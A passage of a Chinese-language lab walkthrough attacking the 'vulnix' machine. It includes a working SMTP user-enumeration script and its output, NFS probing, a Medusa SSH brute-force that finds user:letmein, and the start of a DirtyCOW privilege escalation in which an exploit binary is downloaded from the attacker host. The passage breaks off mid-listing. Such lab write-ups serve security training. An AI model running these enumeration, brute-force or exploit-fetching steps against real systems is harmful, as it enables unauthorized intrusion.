<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> Fore, init</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize colorama for colored output</span></span><br><span class="line">init(autoreset=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">smtp_user_enum</span>(<span class="params">target_host, port, user_file, mode</span>):</span><br><span class="line">    <span class="comment"># Validate the mode</span></span><br><span class="line">    <span class="keyword">if</span> mode <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;VRFY&#x27;</span>, <span class="string">&#x27;EXPN&#x27;</span>, <span class="string">&#x27;RCPT&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(Fore.RED + <span class="string">&quot;Invalid mode. Use VRFY, EXPN, or RCPT.&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(Fore.YELLOW + <span class="string">f&quot;Starting SMTP User Enumeration on <span class="subst">&#123;target_host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(Fore.YELLOW + <span class="string">f&quot;Mode: <span class="subst">&#123;mode&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(Fore.YELLOW + <span class="string">f&quot;Valid users will be saved to: valid_users.txt&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">    tested_users = <span class="built_in">set</span>()  <span class="comment"># To track already tested users</span></span><br><span class="line">    valid_users = []</span><br><span class="line">    smtp = <span class="literal">None</span></span><br><span class="line">    connected_once = <span class="literal">False</span>  <span class="comment"># Flag to check if the initial connection has been made</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Function to create a new connection to the SMTP server</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">connect_smtp</span>():</span><br><span class="line">            <span class="keyword">nonlocal</span> smtp,connected_once</span><br><span class="line">            smtp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            smtp.connect((target_host, <span class="built_in">int</span>(port)))</span><br><span class="line">            banner = smtp.recv(<span class="number">1024</span>).decode()  <span class="comment"># Get the banner</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># print(Fore.GREEN + f&quot;Connected to SMTP Server: &#123;banner.strip()&#125;&quot;)</span></span><br><span class="line">            <span class="comment"># Only print the banner once</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> connected_once:</span><br><span class="line">                <span class="built_in">print</span>(Fore.GREEN + <span class="string">f&quot;Connected to SMTP Server: <span class="subst">&#123;banner.strip()&#125;</span>&quot;</span>)</span><br><span class="line">                connected_once = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Establish initial connection</span></span><br><span class="line">        connect_smtp()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Open the user list file</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(user_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> users:</span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">                user = user.strip()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> user <span class="keyword">in</span> tested_users:</span><br><span class="line">                    <span class="keyword">continue</span>  <span class="comment"># Skip empty lines and already tested users</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># Mark the user as tested</span></span><br><span class="line">                tested_users.add(user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment"># Build the SMTP command based on mode</span></span><br><span class="line">                <span class="keyword">if</span> mode == <span class="string">&#x27;VRFY&#x27;</span>:</span><br><span class="line">                    command = <span class="string">f&quot;VRFY <span class="subst">&#123;user&#125;</span>\r\n&quot;</span></span><br><span class="line">                <span class="keyword">elif</span> mode == <span class="string">&#x27;EXPN&#x27;</span>:</span><br><span class="line">                    command = <span class="string">f&quot;EXPN <span class="subst">&#123;user&#125;</span>\r\n&quot;</span></span><br><span class="line">                <span class="keyword">elif</span> mode == <span class="string">&#x27;RCPT&#x27;</span>:</span><br><span class="line">                    command = <span class="string">f&quot;MAIL FROM:&lt;test@example.com&gt;\r\nRCPT TO:&lt;<span class="subst">&#123;user&#125;</span>&gt;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># Send the command to the server</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    smtp.sendall(command.encode())</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># Receive the response from the server</span></span><br><span class="line">                    response = smtp.recv(<span class="number">1024</span>).decode()</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># Print All Response</span></span><br><span class="line">                    <span class="comment"># print(Fore.CYAN + f&quot;Response: &#123;response.strip()&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment"># Check for valid user response (252 or 250)</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;252 2.0.0&#x27;</span> <span class="keyword">in</span> response <span class="keyword">or</span> <span class="string">&#x27;250 2.1.5&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">                        <span class="built_in">print</span>(Fore.GREEN + <span class="string">f&quot;Valid user found: <span class="subst">&#123;user&#125;</span>&quot;</span>)</span><br><span class="line">                        valid_users.append(user)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">except</span> (socket.error, socket.timeout) <span class="keyword">as</span> e:</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># eg:Error sending command or receiving response: [Errno 104] Connection reset by peer</span></span><br><span class="line">                    <span class="comment"># print(Fore.RED + f&quot;Error sending command or receiving response: &#123;e&#125;&quot;)</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># If there&#x27;s an error, it may be due to the connection being reset or timed out</span></span><br><span class="line">                    <span class="comment"># print(Fore.YELLOW + &quot;Reconnecting...&quot;)</span></span><br><span class="line">                    connect_smtp()  <span class="comment"># Reconnect if an error occurs</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># Retest current user</span></span><br><span class="line">                    smtp.sendall(command.encode())</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># Receive the response from the server</span></span><br><span class="line">                    response = smtp.recv(<span class="number">1024</span>).decode()</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># Print All Response</span></span><br><span class="line">                    <span class="comment"># print(Fore.CYAN + f&quot;Response: &#123;response.strip()&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment"># Check for valid user response (252 or 250)</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;252 2.0.0&#x27;</span> <span class="keyword">in</span> response <span class="keyword">or</span> <span class="string">&#x27;250 2.1.5&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">                        <span class="built_in">print</span>(Fore.GREEN + <span class="string">f&quot;Valid user found: <span class="subst">&#123;user&#125;</span>&quot;</span>)</span><br><span class="line">                        valid_users.append(user)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="built_in">print</span>(Fore.RED + <span class="string">f&quot;Unexpected error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Sleep for a short time to control request speed and avoid flooding the server</span></span><br><span class="line">                <span class="comment"># time.sleep(2)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Close the SMTP connection after processing all users</span></span><br><span class="line">        smtp.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(Fore.RED + <span class="string">f&quot;Error during connection or processing: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Save valid users to file</span></span><br><span class="line">    <span class="keyword">if</span> valid_users:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;valid_users.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">            <span class="keyword">for</span> valid_user <span class="keyword">in</span> valid_users:</span><br><span class="line">                outfile.write(<span class="string">f&quot;<span class="subst">&#123;valid_user&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(Fore.YELLOW + <span class="string">&quot;Enumeration completed.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(Fore.YELLOW + <span class="string">f&quot;Valid users saved to: valid_users.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(Fore.RED + <span class="string">&quot;No valid users found.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(Fore.RED + <span class="string">&quot;Usage: python smtp-user-enum.py &lt;target_host&gt; &lt;port&gt; &lt;user_file&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    target_host = sys.argv[<span class="number">1</span>]</span><br><span class="line">    port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    user_file = sys.argv[<span class="number">3</span>]</span><br><span class="line">    mode = <span class="string">&#x27;VRFY&#x27;</span>  <span class="comment"># You can change this to EXPN or RCPT</span></span><br><span class="line"></span><br><span class="line">    smtp_user_enum(target_host, port, user_file, mode)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>扫描示例</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/smtp-user-enum]</span><br><span class="line">└─<span class="comment"># python smtp-user-enum.py 192.168.159.5 25 /usr/share/metasploit-framework/data/wordlists/unix_users.txt</span></span><br><span class="line">Starting SMTP User Enumeration on 192.168.159.5:25</span><br><span class="line">Mode: VRFY</span><br><span class="line">Valid <span class="built_in">users</span> will be saved to: valid_users.txt</span><br><span class="line">============================================================</span><br><span class="line">Connected to SMTP Server: 220 vulnix ESMTP Postfix (Ubuntu)</span><br><span class="line">Valid user found: backup</span><br><span class="line">Valid user found: bin</span><br><span class="line">Valid user found: daemon</span><br><span class="line">Valid user found: games</span><br><span class="line">Valid user found: irc</span><br><span class="line">Valid user found: landscape</span><br><span class="line">Valid user found: libuuid</span><br><span class="line">Valid user found: list</span><br><span class="line">Valid user found: lp</span><br><span class="line">Valid user found: mail</span><br><span class="line">Valid user found: man</span><br><span class="line">Valid user found: messagebus</span><br><span class="line">Valid user found: news</span><br><span class="line">Valid user found: nobody</span><br><span class="line">Valid user found: postfix</span><br><span class="line">Valid user found: postmaster</span><br><span class="line">Valid user found: proxy</span><br><span class="line">Valid user found: root</span><br><span class="line">Valid user found: ROOT</span><br><span class="line">Valid user found: <span class="built_in">sync</span></span><br><span class="line">Valid user found: sys</span><br><span class="line">Valid user found: syslog</span><br><span class="line">Valid user found: user</span><br><span class="line">Valid user found: uucp</span><br><span class="line">Valid user found: whoopsie</span><br><span class="line">Valid user found: www-data</span><br><span class="line">============================================================</span><br><span class="line">Enumeration completed.</span><br><span class="line">Valid <span class="built_in">users</span> saved to: valid_users.txt</span><br></pre></td></tr></table></figure>
<h2 id="nfs-服务">4. NFS 服务</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt]</span><br><span class="line">└─<span class="comment"># showmount -e 192.168.159.5</span></span><br><span class="line">Export list <span class="keyword">for</span> 192.168.159.5:</span><br><span class="line">/home/vulnix *</span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/mnt]</span><br><span class="line">└─<span class="comment"># mkdir vulnix              </span></span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/mnt]</span><br><span class="line">└─<span class="comment"># ls -al                    </span></span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  3 root root 4096 Dec 18 04:47 .</span><br><span class="line">drwxr-xr-x 18 root root 4096 Aug 18 18:29 ..</span><br><span class="line">drwxr-xr-x  2 root root 4096 Dec 18 04:47 vulnix</span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/mnt]</span><br><span class="line">└─<span class="comment"># mount -t nfs  192.168.159.5:/home/vulnix /mnt/vulnix -o nolock </span></span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/mnt]</span><br><span class="line">└─<span class="comment"># ls -al vulnix </span></span><br><span class="line"><span class="built_in">ls</span>: cannot open directory <span class="string">&#x27;vulnix&#x27;</span>: Permission denied</span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/mnt]</span><br><span class="line">└─<span class="comment"># ls -al                                                        </span></span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  3 root   root    4096 Dec 18 04:47 .</span><br><span class="line">drwxr-xr-x 18 root   root    4096 Aug 18 18:29 ..</span><br><span class="line">drwxr-x---  2 nobody nogroup 4096 Sep  2  2012 vulnix</span><br><span class="line">                                                     </span><br></pre></td></tr></table></figure>
<p>没权限……</p>
<blockquote>
<p><a
target="_blank" rel="noopener" href="https://book.hacktricks.xyz/zh/network-services-pentesting/nfs-service-pentesting">2049
- Pentesting NFS Service | HackTricks</a><br />
权限：如果你挂载一个包含<strong>仅某些用户可访问的文件或文件夹</strong>（通过<strong>UID</strong>）的文件夹。你可以<strong>在本地</strong>创建一个具有该<strong>UID</strong>的用户，并使用该<strong>用户</strong>来<strong>访问</strong>文件/文件夹。</p>
</blockquote>
<p>可能需要本地要创建 vulnix 用户，但不知道 UID ……</p>
<h2 id="ssh-爆破">5. SSH 爆破</h2>
<p>拿 SMTP 测出的用户尝试爆破下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># medusa -u user -P rockyou.txt -h 192.168.159.5 -M ssh</span></span><br><span class="line">Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;</span><br><span class="line"></span><br><span class="line">ACCOUNT CHECK: [ssh] Host: 192.168.159.5 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: 123456 (1 of 14344391 complete)</span><br><span class="line">ACCOUNT CHECK: [ssh] Host: 192.168.159.5 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: 12345 (2 of 14344391 complete)</span><br><span class="line">ACCOUNT CHECK: [ssh] Host: 192.168.159.5 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: 123456789 (3 of 14344391 complete)</span><br><span class="line">ACCOUNT CHECK: [ssh] Host: 192.168.159.5 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: password (4 of 14344391 complete)</span><br><span class="line">ACCOUNT CHECK: [ssh] Host: 192.168.159.5 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: iloveyou (5 of 14344391 complete)</span><br><span class="line">ACCOUNT CHECK: [ssh] Host: 192.168.159.5 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: princess (6 of 14344391 complete)</span><br><span class="line">ACCOUNT CHECK: [ssh] Host: 192.168.159.5 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: 1234567 (7 of 14344391 complete)</span><br><span class="line">ACCOUNT CHECK: [ssh] Host: 192.168.159.5 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: rockyou (8 of 14344391 complete)</span><br><span class="line">ACCOUNT CHECK: [ssh] Host: 192.168.159.5 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: 12345678 (9 of 14344391 complete)</span><br><span class="line">ACCOUNT CHECK: [ssh] Host: 192.168.159.5 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: abc123 (10 of 14344391 complete)</span><br><span class="line"></span><br><span class="line">……………………</span><br><span class="line"></span><br><span class="line">ACCOUNT CHECK: [ssh] Host: 192.168.159.5 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: diego (510 of 14344391 complete)</span><br><span class="line">ACCOUNT CHECK: [ssh] Host: 192.168.159.5 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: brandy (511 of 14344391 complete)</span><br><span class="line">ACCOUNT CHECK: [ssh] Host: 192.168.159.5 (1 of 1, 0 complete) User: user (1 of 1, 0 complete) Password: letmein (512 of 14344391 complete)</span><br><span class="line">ACCOUNT FOUND: [ssh] Host: 192.168.159.5 User: user Password: letmein [SUCCESS]</span><br></pre></td></tr></table></figure>
<p>得 user:letmein</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># ssh user@192.168.159.5   </span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.159.5 (192.168.159.5)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes </span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.159.5<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">user@192.168.159.5&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">  System information as of Wed Dec 18 12:17:31 GMT 2024</span><br><span class="line"></span><br><span class="line">  System load:  0.01             Processes:           89</span><br><span class="line">  Usage of /:   90.3% of 773MB   Users logged <span class="keyword">in</span>:     0</span><br><span class="line">  Memory usage: 7%               IP address <span class="keyword">for</span> eth0: 192.168.159.5</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  =&gt; / is using 90.3% of 773MB</span><br><span class="line"></span><br><span class="line">  Graph this data and manage this system at https://landscape.canonical.com/</span><br><span class="line"></span><br><span class="line">user@vulnix:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(user) gid=1000(user) <span class="built_in">groups</span>=1000(user),100(<span class="built_in">users</span>)</span><br><span class="line">user@vulnix:~$ <span class="built_in">ls</span> -al</span><br><span class="line">total 28</span><br><span class="line">drwxr-x--- 3 user user 4096 Sep  2  2012 .</span><br><span class="line">drwxr-xr-x 4 root root 4096 Sep  2  2012 ..</span><br><span class="line">-rw-r--r-- 1 user user  220 Sep  2  2012 .bash_logout</span><br><span class="line">-rw-r--r-- 1 user user 3486 Sep  2  2012 .bashrc</span><br><span class="line">drwx------ 2 user user 4096 Sep  2  2012 .cache</span><br><span class="line">-rw-r--r-- 1 user user  675 Sep  2  2012 .profile</span><br><span class="line">-rw------- 1 user user    7 Sep  2  2012 .rhosts</span><br><span class="line">user@vulnix:~$ </span><br></pre></td></tr></table></figure>
<h2 id="提权">6. 提权</h2>
<h3 id="dirtycow-提权">6.1. DirtyCOW 提权</h3>
<p>上传 linpeas.sh 后扫描，可能存在 dirtycow 漏洞，经测可成功提权！</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">user@vulnix:/tmp$ wget http://192.168.159.4/dirty</span><br><span class="line">--2024-12-18 12:37:08--  http://192.168.159.4/dirty</span><br><span class="line">Connecting to 192.168.159.4:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 12520 (12K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;dirty&#x27;</span></span><br><span class="line"></span><br><span class="line">100%[==================================================================================================================================================================================================&gt;] 12,520      --.-K/s   <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2024-12-18 12:37:08 (192 MB/s) - <span class="string">&#x27;dirty&#x27;</span> saved [12520/12520]</span><br><span class="line"></span><br><span class="line">user@vulnix:/tmp$ <span class="built_in">chmod</span> +x dirty </span><br><span class="line">user@vulnix:/tmp$ </span><br><span class="line">user@vulnix:/tmp$ gcc --version</span><br><span class="line">The program <span class="string">&#x27;gcc&#x27;</span> can be found <span class="keyword">in</span> the following packages:</span><br><span class="line"> * gcc</span><br><span class="line"> * pentium-builder</span><br><span class="line">Ask your administrator to install one of them</span><br><span class="line">user@vulnix:/tmp$ </span><br><span class="line">user@vulnix:/tmp$ <span class="built_in">ls</span> -al</span><br><span class="line">total 6776</span><br><span class="line">drwxrwxrwt  3 root root    4096 Dec 18 12:37 .</span><br><span class="line">drwxr-xr-x 22 root root    4096 Sep  2  2012 ..</span><br><span class="line">-rwxrwxr-x  1 user user   12520 Oct  8 04:07 dirty</span><br><span class="line">-rwxrwxr-x  1 user user  860549 Mar 28  2024 linpeas.sh</span><br><span class="line">-rwxrwxr-x  1 user user 2940928 Sep 19 08:30 pspy32</span><br><span class="line">-rwxrwxr-x  1 user user 3104768 Mar 28 